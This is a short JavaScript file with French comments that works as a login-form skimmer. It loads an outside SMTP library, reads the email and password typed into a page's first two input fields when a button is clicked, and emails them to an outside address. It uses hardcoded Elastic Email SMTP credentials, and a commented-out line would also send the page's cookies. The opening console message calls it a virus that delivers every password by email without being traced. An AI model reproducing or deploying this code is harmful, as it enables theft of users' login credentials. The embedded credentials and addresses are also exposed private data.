console.log("conecte toi au site web afin de faire propager se virus dans la base de donné pour que tu recoives tout les mot de passe par email 100% sécurisé aucune chance que on te retrouve");
var script1 = document.createElement("script");
script1.id = "test";
script1.src = "https://smtpjs.com/v3/smtp.js";
document.body.appendChild(script1);
//éspace cookie
      var test123 = document.getElementsByTagName('input');

  /*test123.addEventListener("keydown", function(event) {
    if (event.keyCode === 13) {
        maFonction();
    }
   });*/

   btnnn = document.getElementsByTagName('button');
  btnnn[0].addEventListener('click', function(){
      maFonction();
  });
   
   function maFonction() {
    //var cokiesendmailhack = document.cookie;
    var frites = test123[0].value;
    var yaye = test123[1].value;
    var tout = "email: " + frites + " " + "mot de passe: " + yaye;
    Email.send({
        Host: "smtp.elasticemail.com",
        Username: "mateotayeb@gmail.com",
        Password: "CE524F13CB3CB4BFDF6C9A118A244FF61C42",
        port: "2525",
        To: "mateopapa.at@gmail.com",
        From: "mateotayeb@gmail.com",
        Subject: "Sujet de l'email",
        Body: /*cokiesendmailhack*/ + " " +  tout,
    }).then(
        message => console.log(message)
    );
    Email.send()
    console.log("mail envoyé");
   }
